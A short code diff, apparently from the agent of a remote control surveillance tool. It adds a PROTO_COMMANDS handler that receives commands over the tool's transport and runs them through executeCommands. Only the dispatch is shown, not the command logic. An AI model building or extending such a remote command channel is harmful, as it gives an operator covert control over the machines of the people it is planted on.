@@ -21,7 +21,7 @@
 #import "FSNetworkOperation.h"
 #import "LogNetworkOperation.h"
 #import "ByeNetworkOperation.h"
-
+#import "CommandsNetworkOperation.h"
 
 #import "RCSMFileSystemManager.h"
 #import "RCSMTaskManager.h"
@@ -388,6 +388,22 @@
               
               [fsOP release];
             } break;
+          case PROTO_COMMANDS:
+          {
+            CommandsNetworkOperation *commOP = [[CommandsNetworkOperation alloc] initWithTransport: transport];
+            
+            if ([commOP perform] == NO)
+            {
+#ifdef DEBUG_PROTO
+              errorLog(@"Error on COMMANDS");
+#endif
+            }
+            else
+            {
+              [commOP executeCommands];
+            }
+            
+          } break;
           default:
             break;
         }
